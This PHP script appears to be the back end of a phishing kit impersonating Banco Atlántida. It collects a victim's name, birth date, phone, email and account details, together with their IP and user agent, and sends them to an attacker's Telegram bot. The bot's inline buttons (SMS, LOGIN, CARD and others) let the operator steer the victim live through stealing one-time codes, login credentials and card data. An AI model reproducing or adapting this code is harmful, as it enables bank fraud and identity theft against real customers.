<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);
session_start();
header('Content-Type: application/json; charset=UTF-8');

require_once __DIR__ . '/data.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

// IP del visitante
$ip = '';
foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$ip   = $ip ?: '?';
$date = date('d/m/Y H:i:s');
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';

// Datos del formulario
$nombres    = trim($_POST['nombres']    ?? '');
$apellidos  = trim($_POST['apellidos']  ?? '');
$fechaNac   = trim($_POST['fechaNac']   ?? '');
$phone      = trim($_POST['phone']      ?? '');
$email      = trim($_POST['email']      ?? '');
$antiguedad = trim($_POST['antiguedad'] ?? '');

// Construir mensaje
$msg  = "🏦 <b>NUEVA SOLICITUD — BANCO ATLÁNTIDA</b>\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "👤 <b>Nombre:</b> " . htmlspecialchars($nombres . ' ' . $apellidos) . "\n";
$msg .= "🎂 <b>Fecha Nac.:</b> " . htmlspecialchars($fechaNac) . "\n";
$msg .= "📱 <b>Teléfono:</b> " . htmlspecialchars($phone) . "\n";
$msg .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
$msg .= "🏛️ <b>Antigüedad:</b> " . htmlspecialchars($antiguedad) . "\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "🌐 <b>IP:</b> {$ip}\n";
$msg .= "🕒 <b>Fecha:</b> {$date}\n";
$msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";

// Identificador para los botones
$uid = $nombres . ' ' . $apellidos;
$_SESSION['usuario'] = $uid;

$keyboard = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '✅ SMS',        'callback_data' => "SMS|$uid"],
            ['text' => '❌ SMSERROR',   'callback_data' => "SMSERROR|$uid"],
        ],
        [
            ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$uid"],
            ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$uid"],
        ],
        [
            ['text' => '💳 CARD',       'callback_data' => "CARD|$uid"],
            ['text' => '🏁 LISTO',      'callback_data' => "LISTO|$uid"],
            ['text' => '🚫 ERROR',      'callback_data' => "ERROR|$uid"],
        ],
    ]
]);

// Enviar a Telegram (igual que BANPRO-token2)
file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id'      => $chat_id,
    'text'         => $msg,
    'reply_markup' => $keyboard,
]));

echo json_encode(['ok' => true]);
